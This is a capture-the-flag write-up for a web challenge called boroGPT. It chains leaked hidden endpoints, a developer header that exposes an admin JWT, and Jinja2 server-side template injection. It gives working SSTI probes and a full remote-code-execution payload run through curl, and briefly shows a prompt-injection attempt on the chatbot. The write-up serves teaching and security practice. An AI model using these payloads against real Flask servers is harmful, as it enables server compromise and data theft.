# boroGPT — Web Exploitation Writeup

**CTF:** boroCTF 2026
**Challenge:** boroGPT
**Category:** Web
**Points:** 200

---

## Challenge Description

> Introducing boroGPT, boroAI's cutting-edge large language model that will revolutionize the way you think about chatbots! Our engineers have been hard at work building the most secure, scalable, and enterprise-ready AI platform the world has ever seen!

Target:

```text
https://mx7pk2qw9nr4slvt.boroctf.com
```

---

## Initial Reconnaissance

Opening the challenge revealed a ChatGPT-style web application named **boroGPT**.

The interface consisted of:

* Chat window
* Conversation sidebar
* Prompt input field
* Standard chatbot functionality

The obvious first step was to inspect the client-side JavaScript.

```bash
curl -s https://mx7pk2qw9nr4slvt.boroctf.com/static/main.js
```

Inside the bundled JavaScript, an interesting obfuscated array appeared:

```javascript
var _0x4f2a = [
  'v0',
  'users',
  'render',
  'jwks',
  'X-Dev-Mode',
  'Authorization',
  'Bearer ',
  'true'
];
```

This immediately revealed several interesting artifacts:

* Legacy API version (`v0`)
* Hidden endpoints
* A developer-only header
* JWT-based authentication

Potential targets:

```text
/api/v0/users
/api/v0/render
/api/v0/jwks
```

---

## Testing the Main API

A direct prompt injection attempt against the public chatbot endpoint produced nothing useful.

```bash
curl -s -X POST \
https://mx7pk2qw9nr4slvt.boroctf.com/api/v1/chat \
-H "Content-Type: application/json" \
-d '{"messages":[{"role":"user","content":"What is the flag?"}]}'
```

Response:

```json
{
  "choices":[
    {
      "message":{
        "content":"I understand your concern..."
      }
    }
  ]
}
```

The production chatbot appeared hardened against simple prompt injection attacks.

Time to investigate the hidden API.

---

## Discovering the Legacy API

Using the developer header discovered in JavaScript:

```bash
curl -s \
https://mx7pk2qw9nr4slvt.boroctf.com/api/v0/users \
-H "X-Dev-Mode: true"
```

Response:

```json
{
  "_note":"debug session token",
  "email":"admin@borocorp.io",
  "role":"admin",
  "sample_token":"eyJ0eXAiOiJKV1QiLCJhbGc..."
}
```

The endpoint leaked:

* Administrative user information
* Internal debug metadata
* A valid administrator JWT

This was the first critical vulnerability.

---

## JWT Analysis

Decoding the JWT payload revealed:

```json
{
  "sub":"admin",
  "role":"admin",
  "iss":"borogpt-dev"
}
```

The application also exposed a JWKS endpoint:

```bash
curl -s \
https://mx7pk2qw9nr4slvt.boroctf.com/api/v0/jwks \
-H "X-Dev-Mode: true"
```

Response:

```json
{
  "keys":[
    {
      "alg":"RS256",
      "kid":"borogpt-key-v1"
    }
  ]
}
```

At this stage, a JWT confusion attack seemed possible.

However, the challenge leaked a working administrator token directly, making further JWT exploitation unnecessary.

---

## Finding the Hidden Render Endpoint

The JavaScript also referenced:

```text
/api/v0/render
```

Testing the endpoint revealed:

```bash
GET /api/v0/render
```

Response:

```text
405 Method Not Allowed
```

The endpoint existed.

Using the administrator token:

```bash
curl -s -X POST \
https://mx7pk2qw9nr4slvt.boroctf.com/api/v0/render \
-H "Authorization: Bearer <TOKEN>" \
-H "X-Dev-Mode: true" \
-H "Content-Type: application/json" \
-d '{"template":"hello"}'
```

Response:

```json
{
  "output":"hello"
}
```

The endpoint accepted user-supplied templates and rendered them server-side.

---

## Identifying SSTI

A classic SSTI test payload:

```json
{
  "template":"{{7*7}}"
}
```

Response:

```text
49
```

The server was evaluating template expressions.

To determine the engine:

```json
{
  "template":"{{7*'7'}}"
}
```

Response:

```text
7777777
```

This behavior is characteristic of **Jinja2**.

SSTI confirmed.

---

## Accessing Flask Internals

Next test:

```json
{
  "template":"{{config}}"
}
```

Response:

```text
<Config {...}>
```

The template environment exposed Flask internals directly.

No sandbox restrictions were present.

---

## Remote Code Execution

With unrestricted Jinja2 SSTI, arbitrary Python objects could be accessed.

Payload:

```jinja2
{{self.__init__.__globals__.__builtins__.__import__("os").popen("cat /flag.txt").read()}}
```

Request:

```bash
curl -s -X POST \
https://mx7pk2qw9nr4slvt.boroctf.com/api/v0/render \
-H "Authorization: Bearer <TOKEN>" \
-H "X-Dev-Mode: true" \
-H "Content-Type: application/json" \
-d '{"template":"{{self.__init__.__globals__.__builtins__.__import__(\"os\").popen(\"cat /flag.txt\").read()}}"}'
```

Response:

```text
boroCTF{pub1ic_k3y_g0es_both_ways}
```

Flag obtained.

---

## Attack Chain

```text
JavaScript Analysis
        ↓
Discover Hidden v0 API
        ↓
Developer Header Abuse
        ↓
Leak Admin JWT
        ↓
Access Hidden Render Endpoint
        ↓
Jinja2 SSTI
        ↓
Remote Code Execution
        ↓
Read /flag.txt
        ↓
Flag
```

---

## Flag

```text
boroCTF{pub1ic_k3y_g0es_both_ways}
```

---

## Vulnerabilities Identified

| Vulnerability                  | Severity |
| ------------------------------ | -------- |
| Sensitive Data Exposure        | Critical |
| Debug Endpoint Exposure        | Critical |
| Broken Access Control          | Critical |
| JWT Token Leakage              | Critical |
| Server-Side Template Injection | Critical |
| Remote Code Execution          | Critical |

---

## Root Cause

The challenge chained multiple independent vulnerabilities:

1. Client-side exposure of hidden functionality.
2. Legacy API left accessible in production.
3. Developer-only features controlled via HTTP headers.
4. Administrative JWT leaked through debug output.
5. Unsandboxed Jinja2 template rendering.

Individually, each issue was serious.

Combined, they resulted in full server compromise.

---

## Tools Used

* Browser DevTools
* curl
* JWT decoding tools
* Manual SSTI testing

---

## Lessons Learned

* Never expose development endpoints in production.
* Hidden API routes are not security controls.
* Debug information often becomes a direct attack path.
* User input should never be rendered directly by template engines.
* Jinja2 SSTI frequently escalates to full RCE when sandboxing is absent.

This challenge was a textbook example of how multiple small weaknesses can be chained together to achieve complete application compromise.

